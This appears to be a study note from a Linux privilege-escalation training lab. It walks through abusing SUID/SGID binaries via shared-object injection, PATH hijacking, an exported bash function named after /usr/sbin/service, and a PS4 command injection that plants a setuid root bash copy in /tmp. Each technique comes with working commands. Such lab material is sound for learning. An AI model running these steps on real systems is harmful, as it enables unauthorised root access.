# SUID/SGUID executables

## Known Exploits 
- Use the following find command - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
- find the executables and see if you can find any exploit from exploit db
- Run them & see if you have any privilege escalation exploit to obtain the root shell.

## Shared Object injection
- the executable `/usr/local/bin/suid-so` is vulnerable to shared object injection
- you can find a progress bar before exiting
- run `strace` on this file to trace system calls & search the output for open|access calls & "no such file" errors.
- command is as follows - `strace /usr/local/bin/suid-so 2>&1 | egrep -iE "access|open|no such file"`
- it tries to load a shared object from the user's home directory (`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`)
- You have code that which spawns a bash shell
- Create a shared object in that directory & see what happens
- command for creating shared object - `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

## Environmental Variables
- the `/usr/local/bin/suid-env` executable can be exploited due to it inheriting the user's PATH environmental variable & attempting to execute the programs without specifying the users path
- search for any printable characters by using - `strings /usr/local/bin/suid-env`
- compile the code which gives a bash shell - `gcc -o service /home/user/tools/suid/service.c`
- ensure the service executable is present in the path & run the suid-env again to gain access to root shell.

## Abusing Shell Features #1
- the `/usr/local/bin/suid-env2` uses an absolute full path of service
- In the previous versions of bash, you can use the shell function names that resemble file paths, then export those functions so that they are used, instead of actual executable at the file path.
- create & export the following function
```

function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

```
- Now try executing the file `/usr/local/bin/suid-env2` and see that you can obtain a rootshell without any issues.

## Abusing Shell Features #2

- The following will not work on bash versions 4.4 & above
- when in debugging mode, bash uses the environmental variable PS4 to display an extra prompt for debugging statements.
- Set the variable PS4 to an embedded command
- `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
- Now if you run `/tmp/rootbash -p` you get a root shell


